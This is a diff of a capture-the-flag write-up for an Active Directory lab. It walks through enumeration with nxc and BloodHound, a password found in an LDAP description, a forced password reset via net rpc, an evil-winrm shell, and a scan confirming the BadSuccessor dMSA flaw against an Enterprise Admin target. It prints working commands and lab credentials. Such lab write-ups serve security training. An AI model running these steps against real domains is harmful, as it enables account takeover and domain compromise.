@@ -8,6 +8,8 @@ os: "Windows Server 2025"
 tags: ["windows", "active-directory", "badsuccessor", "dmsa", "forcechangepassword", "dcsync", "bloodyad", "bloodhound"]
 ---
 
+![MidGarden2 Banner](/assets/images/ctf/midgarden2/banner.png)
+
 ---
 
 ## Overview
@@ -16,7 +18,9 @@ tags: ["windows", "active-directory", "badsuccessor", "dmsa", "forcechangepasswo
 **Difficulty:** Hard
 **Domain:** yggdrasil.hacksmarter
 
-A comprehensive penetration test of an Active Directory environment running Windows Server 2025. The client has a mature security posture with previous testing, requiring identification of overlooked attack vectors - specifically the new BadSuccessor vulnerability affecting Delegated Managed Service Accounts (dMSA).
+As a member of the Hack Smarter Red Team, you have been assigned to this engagement to conduct a comprehensive penetration test of the client's internal environment.
+
+The client has a mature security posture and has previously undergone multiple internal penetration testing engagements. Given our team's advanced expertise in ethical hacking, the primary objective of this assessment is to identify attack vectors that may have been overlooked in prior engagements.
 
 ---
 
@@ -84,20 +88,19 @@ nmap -sCV 10.1.52.173
 ```
 
 ```
-Port      Service         Version
-────────────────────────────────────────────────────────
-53        DNS             Simple DNS Plus
-88        Kerberos        Microsoft Windows Kerberos
-135       MSRPC           Microsoft Windows RPC
-139       NetBIOS-SSN     Microsoft Windows netbios-ssn
-389       LDAP            Active Directory LDAP
-445       SMB             Microsoft-DS
-464       kpasswd5
-593       ncacn_http      Microsoft Windows RPC over HTTP 1.0
-636       LDAPS           tcpwrapped
-3268      LDAP            Active Directory LDAP (GC)
-3269      LDAPS           tcpwrapped
-3389      RDP             Microsoft Terminal Services
+PORT      STATE  SERVICE           VERSION
+53/tcp    open   domain            Simple DNS Plus
+88/tcp    open   kerberos-sec      Microsoft Windows Kerberos
+135/tcp   open   msrpc             Microsoft Windows RPC
+139/tcp   open   netbios-ssn       Microsoft Windows netbios-ssn
+389/tcp   open   ldap              Microsoft Windows Active Directory LDAP
+445/tcp   open   microsoft-ds?
+464/tcp   open   kpasswd5?
+593/tcp   open   ncacn_http        Microsoft Windows RPC over HTTP 1.0
+636/tcp   open   tcpwrapped
+3268/tcp  open   ldap              Microsoft Windows Active Directory LDAP (GC)
+3269/tcp  open   tcpwrapped
+3389/tcp  open   ssl/ms-wbt-server Microsoft Terminal Services
 ```
 
 **Key Findings:**
@@ -113,6 +116,8 @@ nxc smb 10.1.52.173 -u 'freyja' -p 'Fr3yja!Dr@g0n^12'
 ```
 
 ```
+SMB  10.1.52.173  445  MIDGARDDC  [*] Windows 11 / Server 2025 Build 26100 x64
+     (name:MIDGARDDC) (domain:yggdrasil.hacksmarter) (signing:True) (SMBv1:False)
 SMB  10.1.52.173  445  MIDGARDDC  [+] yggdrasil.hacksmarter\freyja:Fr3yja!Dr@g0n^12
 ```
 
@@ -140,18 +145,17 @@ nxc ldap 10.1.52.173 -u freyja -p 'Fr3yja!Dr@g0n^12' --users
 ```
 
 ```
-Username        Last PW Set         Description
-────────────────────────────────────────────────────────────────
-Administrator   2025-09-06          Built-in account for administering
-krbtgt          2025-09-06          Key Distribution Center Service Account
-Odin            2025-11-06          DA
-Ymir            2025-09-06          EA
-Thor            2025-09-06          Temp:Th0r!W!nt3rFang
-Loki            2025-09-06
-Frigg           2025-09-06
-Freyja          2025-09-06
-Hodr            2025-09-14          Web Server Administrator
-Heimdall        2025-09-14          Seriously Secure service account
+LDAP  10.1.52.173  389  MIDGARDDC  [*] Enumerated 21 domain users: yggdrasil.hacksmarter
+LDAP  10.1.52.173  389  MIDGARDDC  -Username-        -Last PW Set-       -Description-
+LDAP  10.1.52.173  389  MIDGARDDC  Administrator     2025-09-06 06:40:14  Built-in account...
+LDAP  10.1.52.173  389  MIDGARDDC  krbtgt            2025-09-06 06:48:07  Key Distribution...
+LDAP  10.1.52.173  389  MIDGARDDC  Odin              2025-11-06 20:17:55  DA
+LDAP  10.1.52.173  389  MIDGARDDC  Ymir              2025-09-06 07:28:27  EA
+LDAP  10.1.52.173  389  MIDGARDDC  Thor              2025-09-06 07:27:54  Temp:Th0r!W!nt3rFang
+LDAP  10.1.52.173  389  MIDGARDDC  Loki              2025-09-06 07:19:50
+LDAP  10.1.52.173  389  MIDGARDDC  Frigg             2025-09-06 07:28:39
+LDAP  10.1.52.173  389  MIDGARDDC  Hodr              2025-09-14 19:21:08  Web Server Administrator
+LDAP  10.1.52.173  389  MIDGARDDC  Heimdall          2025-09-14 19:21:08  Seriously Secure service account
 ...
 ```
 
@@ -172,11 +176,7 @@ rusthound -d "yggdrasil.hacksmarter" -u "freyja" -p 'Fr3yja!Dr@g0n^12' \
 [INFO] 13 ous parsed!
 ```
 
-BloodHound analysis revealed:
-- Thor is member of **PC Specialist 2** group
-- Thor has **ForceChangePassword** over Hodr
-- Hodr is member of **webServerAdmins**
-- webServerAdmins has permissions on **Web Servers OU**
+Within BloodHound, Freyja did not have any outbound controls - we need to pivot through Thor.
 
 ---
 
@@ -184,7 +184,7 @@ BloodHound analysis revealed:
 
 ## 2.1 Password Spray - Thor
 
-Validating the discovered password:
+Validating the discovered password from LDAP description:
 
 ```bash
 nxc smb 10.1.52.173 -u Thor -p 'Th0r!W!nt3rFang'
@@ -194,9 +194,15 @@ nxc smb 10.1.52.173 -u Thor -p 'Th0r!W!nt3rFang'
 SMB  10.1.52.173  445  MIDGARDDC  [+] yggdrasil.hacksmarter\Thor:Th0r!W!nt3rFang
 ```
 
-## 2.2 ForceChangePassword - Hodr
+## 2.2 BloodHound Analysis - Thor's Permissions
 
-Thor has ForceChangePassword ACL over Hodr. Using net rpc to change password:
+BloodHound revealed that Thor is a member of **PC Specialist 2** group and has **ForceChangePassword** rights over Hodr.
+
+![Thor ForceChangePassword to Hodr](/assets/images/ctf/midgarden2/thor-forcechangepassword.png)
+
+## 2.3 ForceChangePassword - Hodr
+
+Using net rpc to change Hodr's password:
 
 ```bash
 net rpc password 'hodr' 'Password123!' -U "yggdrasil.hacksmarter"/"thor"%'Th0r!W!nt3rFang' -S "10.1.52.173"
@@ -212,15 +218,24 @@ nxc smb 10.1.52.173 -u hodr -p Password123!
 SMB  10.1.52.173  445  MIDGARDDC  [+] yggdrasil.hacksmarter\hodr:Password123!
 ```
 
-## 2.3 WinRM Access as Hodr
+## 2.4 BloodHound Analysis - Hodr's Permissions
 
-Hodr is a member of Remote Management Users:
+Analyzing Hodr's group memberships revealed membership in:
+- **webServerAdmins** group
+- **Remote Management Users** (enabling WinRM access)
+
+![Hodr Group Memberships](/assets/images/ctf/midgarden2/hodr-groups.png)
+
+## 2.5 WinRM Access as Hodr
 
 ```bash
 evil-winrm -u hodr -p 'Password123!' -i "10.1.52.173"
 ```
 
 ```
+Evil-WinRM shell v3.7
+
+Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Hodr.YGGDRASIL\Documents>
 ```
 
@@ -234,6 +249,8 @@ On the C: drive, scripts related to dMSA management were found:
 
 ```powershell
 *Evil-WinRM* PS C:\scripts> ls
+
+    Directory: C:\scripts
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
@@ -265,7 +282,7 @@ Preceded By :
 
 Key group membership: **YGGDRASIL\webServerAdmins**
 
-This group has permissions to create dMSA accounts in the Web Servers OU.
+This group has permissions to create objects in the Web Servers OU.
 
 ## 3.4 BadSuccessor Vulnerability Scan
 
@@ -277,18 +294,18 @@ nxc ldap 10.1.52.173 -u hodr -p Password123! -M badsuccessor
 
 ```
 LDAP        10.1.52.173  389  MIDGARDDC  [+] yggdrasil.hacksmarter\hodr:Password123!
-BADSUCCE... 10.1.52.173  389  MIDGARDDC  [+] Found domain controller with operating system Windows Server 2025
+BADSUCCE... 10.1.52.173  389  MIDGARDDC  [+] Found domain controller with operating system
+            Windows Server 2025: 10.1.52.173 (MidgardDC.yggdrasil.hacksmarter)
 BADSUCCE... 10.1.52.173  389  MIDGARDDC  [+] Found 1 results
-BADSUCCE... 10.1.52.173  389  MIDGARDDC  webServerAdmins (S-1-5-21-4282326175-1721253212-1354516517-1601), OU=Web Servers,OU=Yggdrasil Servers,DC=yggdrasil,DC=hacksmarter
+BADSUCCE... 10.1.52.173  389  MIDGARDDC  webServerAdmins (S-1-5-21-4282326175-1721253212-
+            1354516517-1601), OU=Web Servers,OU=Yggdrasil Servers,DC=yggdrasil,DC=hacksmarter
 ```
 
 **Confirmed:** webServerAdmins can create dMSAs in Web Servers OU - BadSuccessor is exploitable!
 
 ## 3.5 Target Identification - Ymir (Enterprise Admin)
 
-```bash
-nxc ldap 10.1.52.173 -u hodr -p Password123! --users | grep -i ymir
-```
+From LDAP enumeration we know Ymir is the Enterprise Admin.
 
 **Target DN:** `CN=Ymir,OU=Administrators,OU=Yggdrasil Users,DC=yggdrasil,DC=hacksmarter`
 
